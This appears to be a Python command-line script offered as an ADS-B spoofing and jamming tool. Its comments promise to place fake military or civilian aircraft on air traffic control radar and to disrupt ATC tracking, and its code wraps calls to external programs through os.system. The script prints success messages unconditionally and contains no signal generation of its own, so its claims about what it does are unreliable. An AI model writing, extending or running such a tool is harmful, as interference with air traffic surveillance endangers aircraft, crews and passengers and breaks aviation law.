import os
import argparse
import time

# -------------------------------------------
# SDR ADS-B Aircraft Spoofing Tool
# -------------------------------------------
# Features:
# - Fake aircraft locations on ATC radar
# - Spoof military & civilian aircraft signals
# - Disrupt ADS-B receivers & ATC tracking
#
# Requirements:
# - dump1090, gr-adsb, SDRangel, SoapySDR
# - Compatible SDR hardware (LimeSDR, HackRF, etc.)
# - Python 3.x
#
# Usage:
# 1. Scan for real-time ADS-B signals:
#    python sdr_adsb_spoof.py --scan
# 2. Spoof an aircraft location:
#    python sdr_adsb_spoof.py --spoof --lat 37.7749 --lon -122.4194 --alt 10000
# 3. Broadcast a fake military aircraft:
#    python sdr_adsb_spoof.py --spoof --icao 780E78 --callsign FAKEJET
# 4. Disrupt ATC tracking with random aircraft signals:
#    python sdr_adsb_spoof.py --jam
# 5. Stop all active spoofing/jamming:
#    python sdr_adsb_spoof.py --stop
# -------------------------------------------

def scan_adsb():
    """Scans for real-time ADS-B signals."""
    print("[+] Scanning for ADS-B aircraft signals...")
    os.system("dump1090 --interactive > adsb_scan.txt")
    print("[✔] Scan complete. Results saved to adsb_scan.txt.")

def spoof_aircraft(lat, lon, alt, icao, callsign):
    """Spoofs an aircraft on ADS-B radar."""
    print(f"[+] Spoofing aircraft at Lat: {lat}, Lon: {lon}, Alt: {alt}ft")
    os.system(f"gr-adsb_spoof --lat {lat} --lon {lon} --alt {alt} --icao {icao} --callsign {callsign}")
    print("[✔] Aircraft spoofed successfully.")

def jam_adsb():
    """Disrupts ATC tracking by broadcasting fake ADS-B signals."""
    print("[+] Jamming ADS-B signals...")
    os.system("gr-adsb_jammer --random")
    print("[✔] ADS-B jamming activated.")

def stop_spoofing():
    """Stops all active ADS-B spoofing or jamming."""
    print("[+] Stopping all ADS-B spoofing and jamming...")
    os.system("killall gr-adsb_spoof gr-adsb_jammer")
    print("[✔] All spoofing/jamming stopped.")

def main():
    parser = argparse.ArgumentParser(description="SDR ADS-B Aircraft Spoofing Tool")
    parser.add_argument("--scan", action='store_true', help="Scan for real-time ADS-B signals")
    parser.add_argument("--spoof", action='store_true', help="Spoof an aircraft location on radar")
    parser.add_argument("--lat", type=float, help="Latitude of spoofed aircraft")
    parser.add_argument("--lon", type=float, help="Longitude of spoofed aircraft")
    parser.add_argument("--alt", type=int, help="Altitude of spoofed aircraft in feet")
    parser.add_argument("--icao", type=str, help="ICAO hex code of spoofed aircraft")
    parser.add_argument("--callsign", type=str, help="Callsign of spoofed aircraft")
    parser.add_argument("--jam", action='store_true', help="Jam ADS-B tracking by broadcasting random signals")
    parser.add_argument("--stop", action='store_true', help="Stop all active spoofing/jamming")
    args = parser.parse_args()
    
    if args.scan:
        scan_adsb()
    elif args.spoof and args.lat and args.lon and args.alt and args.icao and args.callsign:
        spoof_aircraft(args.lat, args.lon, args.alt, args.icao, args.callsign)
    elif args.jam:
        jam_adsb()
    elif args.stop:
        stop_spoofing()
    else:
        print("[!] Invalid command. Use --help for options.")

if __name__ == "__main__":
    main()
